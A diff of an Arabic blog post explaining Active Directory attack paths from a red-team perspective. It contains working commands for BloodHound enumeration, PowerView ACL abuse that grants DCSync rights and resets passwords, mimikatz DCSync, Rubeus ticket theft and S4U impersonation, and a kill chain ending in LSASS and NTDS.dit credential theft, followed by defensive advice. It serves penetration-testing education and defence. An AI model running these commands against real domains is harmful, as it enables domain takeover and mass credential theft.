@@ -1,111 +1,119 @@
 ---
 layout: blog
-title: "مسارات الهجوم في Active Directory: منهجية البحث عن الثغرات وتسلسل الصلاحيات"
-date: 2026-04-04T14:57:12Z
+title: "مسارات الهجوم في Active Directory: منهجية الكشف والاستغلال من منظور Red Team"
+date: 2026-04-04T15:44:36Z
 category: "منهجية"
-excerpt: "في بيئات Active Directory، لا يكفي اختراق حساب واحد. النجاح الحقيقي يكمن في فهم مسارات الهجوم التي تربط بين الكائنات المختلفة. هذه المسارات تشكل خريطة طريق للوصول من نقطة دخول بسيطة إلى Domain Admin. نستعرض هنا منهجية احترافية لاكتشاف واستغلال هذه المسارات."
+excerpt: "بيئة Active Directory ليست مجرد خدمة مصادقة، بل شبكة معقدة من العلاقات والصلاحيات التي تشكل مسارات خفية للتصعيد. فهم Attack Paths يعني رؤية الشبكة كما يراها المهاجم: سلسلة من القفزات المنطقية من نقطة الاختراق الأولى إلى Domain Admin. هذه المنهجية تحول عملية الاختبار من محاولات عشوائية إلى استراتيجية ممنهجة."
 read_time: 8
-tags: ["Active Directory", "Privilege Escalation", "BloodHound", "Attack Paths", "Post-Exploitation"]
+tags: ["Active Directory", "Attack Paths", "BloodHound", "Privilege Escalation", "Red Team"]
 slug: "ad-attack-paths"
 image: "/OffsecAR/assets/images/blogs/ad-attack-paths.svg"
 ---
 
-## فهم Attack Paths في Active Directory
+## فلسفة Attack Paths في بيئات AD
 
-عندما نتحدث عن Attack Paths، نعني سلسلة من العلاقات والصلاحيات التي يمكن استغلالها للانتقال من كائن منخفض الامتياز إلى هدف عالي القيمة. البيئة ليست مسطحة، بل شبكة معقدة من Trust Relationships وPermissions وGroup Memberships.
+عندما ننظر إلى Active Directory من منظور هجومي، نتعامل مع Graph Structure ضخم. كل كائن (User، Computer، Group) هو Node، والعلاقات بينها (MemberOf، GenericAll، WriteDacl) هي Edges. المسار الهجومي ليس خطًا مستقيمًا، بل سلسلة من الصلاحيات المتداخلة.
 
-المهاجم الماهر لا يبحث عن ثغرة واحدة مدمرة، بل يفهم كيف تتشابك الصلاحيات. حساب مستخدم عادي قد يملك GenericAll على Group، والـ Group يملك WriteDacl على Computer، والـ Computer يحوي Unconstrained Delegation. هذا مسار هجوم كامل.
+المهاجم المحترف لا يبحث عن ثغرة واحدة كبيرة. يبحث عن تراكم صغير في الصلاحيات: حساب خدمة له Kerberoastable ticket، مجموعة لها GenericWrite على مجموعة أخرى، Computer Account له Unconstrained Delegation. كل نقطة ضعف منفصلة قد تبدو تافهة، لكن مجتمعة تصنع طريقًا سريعًا لـ Domain Compromise.
 
-## أدوات التعداد والتحليل
+## منهجية Enumeration للمسارات
 
-أداة BloodHound أحدثت ثورة في هذا المجال. تجمع البيانات من Active Directory وتحللها كـ Graph Database، مما يكشف العلاقات المخفية.
+الخطوة الأولى دائمًا هي Mapping. أدوات مثل BloodHound غيرت قواعد اللعبة لأنها تحول البيانات الخام إلى علاقات مرئية. لكن الأداة وحدها لا تكفي، الفهم العميق للعلاقات هو المفتاح.
 
 ```powershell
 # جمع البيانات باستخدام SharpHound
-.\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp
+.\SharpHound.exe -c All --zipfilename ad_audit.zip
 
-# أو استخدام Python ingestor
-bloodhound-python -d corp.local -u user -p pass -c All -ns 10.10.10.10
+# أو الإصدار Python لبيئات Linux
+bloodhound-python -d domain.local -u user -p pass -ns 10.10.10.10 -c all
 ```
 
-بعد رفع البيانات لـ BloodHound، نستخدم Cypher queries للبحث عن مسارات محددة:
+بعد التحليل في BloodHound، ركز على Queries الأساسية:
+- Shortest Paths to Domain Admins
+- Kerberoastable Users with most privileges
+- Computers with Unconstrained Delegation
+- Users with DCSync Rights
+
+لكن لا تتوقف عند Pre-built Queries. Custom Cypher Queries تكشف مسارات غير تقليدية:
 
 ```cypher
-// إيجاد أقصر مسار من Owned Users إلى Domain Admins
-MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group))
-WHERE g.name =~ 'DOMAIN ADMINS@.*'
-RETURN p
-
-// كشف Users مع Unconstrained Delegation
-MATCH (u:User {unconstraineddelegation:true}) RETURN u
-
-// إيجاد Computers يمكن الوصول إليها عبر Local Admin
-MATCH p=(u:User)-[:AdminTo*1..]->(c:Computer) 
-WHERE u.name =~ 'CURRENT_USER@.*'
-RETURN p
+// البحث عن مستخدمين لهم صلاحيات على GPOs مرتبطة بـ Domain Controllers
+MATCH (u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl]->(g:GPO)
+MATCH (g)-[r2:GpLink]->(ou:OU)
+MATCH (ou)-[r3:Contains*1..]->(c:Computer)-[r4:MemberOf*1..]->(g2:Group)
+WHERE g2.name = 'DOMAIN CONTROLLERS@DOMAIN.LOCAL'
+RETURN u,g,ou,c
 ```
 
-## أنماط المسارات الشائعة
+## استغلال ACL Chains
 
-### GenericAll/GenericWrite على Users
-هذه الصلاحيات تسمح بتعديل خصائص المستخدم، بما في ذلك إضافة SPN للـ Kerberoasting أو تغيير كلمة المرور.
+أخطر المسارات هي ACL Abuse Chains. تخيل: لديك صلاحية GenericAll على User A، وهذا User عضو في Group B، والمجموعة لها WriteDacl على Domain Object. هذه ثلاث قفزات لـ DCSync.
 
 ```powershell
-# إضافة SPN للمستخدم المستهدف
-Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='ops/whatever'}
+# الخطوة 1: تغيير كلمة مرور User A
+$SecPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-ADAccountPassword -Identity userA -NewPassword $SecPassword -Reset
 
-# طلب TGS وكسره
-Request-SPNTicket -SPN 'ops/whatever' | Export-Clixml ticket.xml
+# الخطوة 2: إضافة صلاحية DCSync للمستخدم الحالي عبر User A
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackerUser -Rights DCSync -Credential $cred
+
+# الخطوة 3: تنفيذ DCSync
+mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
 ```
 
-### WriteDacl/WriteOwner
-القدرة على تعديل ACLs تعني إعطاء نفسك أي صلاحية تريدها.
+أداة PowerView توفر مرونة كبيرة لاكتشاف هذه السلاسل:
 
 ```powershell
-# منح نفسك GenericAll على الكائن
-Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All
-
-# ثم تغيير كلمة المرور
-$pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
-Set-DomainUserPassword -Identity targetuser -AccountPassword $pass
+# البحث عن كل الصلاحيات التي يملكها مستخدم معين
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
+    Where-Object {$_.SecurityIdentifier -match "^S-1-5-21-.*-[0-9]{4,}$"}
 ```
 
-### Group Membership Chains
-العضوية المتداخلة في Groups تخلق مسارات غير مرئية. User في GroupA، وGroupA في GroupB، وGroupB لديها صلاحيات حساسة.
+## مسارات Kerberos Delegation
 
-### GPO-Based Attacks
-إذا كان لديك تحكم في GPO يطبق على OU معينة، يمكنك تنفيذ أوامر على جميع الأجهزة فيها.
+Delegation في Kerberos يُنشئ مسارات جانبية خطيرة. Unconstrained Delegation يسمح لك بسرقة TGT لأي مستخدم يتصل بالجهاز، بينما Constrained Delegation يمكن استغلاله عبر Protocol Transition.
 
-## منهجية الاستغلال العملية
+```bash
+# كشف Unconstrained Delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
 
-الخطوة الأولى هي تحديد موقعك الحالي. أي صلاحيات تملك؟ أي Groups تنتمي إليها؟
+# استغلال عبر Rubeus
+Rubeus.exe monitor /interval:5 /filteruser:DC01$
 
-```powershell
-# معرفة صلاحياتك الحالية
-whoami /all
-
-# تعداد Group Memberships
-Get-DomainGroup -UserName currentuser
-
-# كشف Outbound Object Control
-Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'currentuser'}
+# بعد الحصول على TGT
+Rubeus.exe ptt /ticket:base64ticket
 ```
 
-الخطوة الثانية هي رسم المسارات الممكنة. استخدم BloodHound لتحديد أقصر طريق نحو الهدف. قد يكون الطريق المباشر محميًا، لكن المسار الجانبي عبر Service Accounts أو Computers قد يكون مفتوحًا.
+لـ Constrained Delegation مع Protocol Transition:
 
-الخطوة الثالثة هي التنفيذ التدريجي. كل قفزة في المسار تحتاج validation قبل الانتقال للتالية. احفظ Credentials المكتسبة، واستخدم OPSEC الجيد لتجنب Detection.
+```bash
+# الحصول على Service Ticket لأي مستخدم
+Rubeus.exe s4u /user:serviceAccount$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
+```
 
-## الدفاع ضد Attack Paths
+## بناء Kill Chain متكامل
 
-من منظور defensive، فهم هذه المسارات ضروري. قم بتشغيل BloodHound دوريًا على بيئتك الخاصة. ابحث عن:
+المسار الهجومي الناجح يجمع تقنيات متعددة. مثال واقعي:
 
-- Users مع صلاحيات مفرطة
-- Nested Groups غير ضرورية
-- Stale Accounts مع امتيازات عالية
-- Delegation Configurations الخطرة
+1. **Initial Access**: Phishing للحصول على Low-privileged User
+2. **Enumeration**: اكتشاف أن هذا User له WriteDacl على Service Account
+3. **Privilege Abuse**: إضافة SPN للـ Service Account
+4. **Kerberoasting**: استخراج وكسر الـ Hash
+5. **Lateral Movement**: Service Account له Local Admin على Server
+6. **Credential Harvesting**: استخراج Credentials من LSASS
+7. **Domain Escalation**: أحد الـ Credentials لمستخدم في Backup Operators
+8. **Final Goal**: استخدام Backup Privileges لقراءة NTDS.dit
 
-استخدم أدوات مثل PingCastle وPurpleKnight لتقييم وضعك الأمني. طبق Tier Model لعزل الصلاحيات الإدارية. راجع ACLs بانتظام وأزل الصلاحيات غير المبررة.
+كل خطوة تبدو بسيطة، لكن الربط بينها يتطلب فهم عميق للعلاقات.
 
-## الخلاصة
+## الدفاع من منظور Attack Paths
 
-مسارات الهجوم في Active Directory ليست ثغرات بالمعنى التقليدي، بل تكوينات تراكمية تخلق فرصًا. الفهم العميق لـ Graph Theory وعلاقات الصلاحيات يحول المهاجم من Opportunistic إلى Methodical. سواء كنت Red Teamer أو Defender، BloodHound وأدوات تحليل المسارات أصبحت أساسية في ترسانتك.
+فهم المسارات الهجومية يجعلك مدافعًا أفضل. ركز على:
+
+- **Tier Model Implementation**: عزل Administrative Accounts
+- **LAPS Deployment**: منع Lateral Movement عبر Local Admin passwords
+- **Constrained Delegation Audit**: مراجعة كل حالات التفويض
+- **ACL Hygiene**: إزالة Excessive Permissions
+- **Monitoring Critical Paths**: تنبيهات فورية عند استخدام DCSync أو Golden Ticket
+
+الأمان الحقيقي لا يأتي من سد ثغرة واحدة، بل من كسر السلاسل التي تربط المسارات.
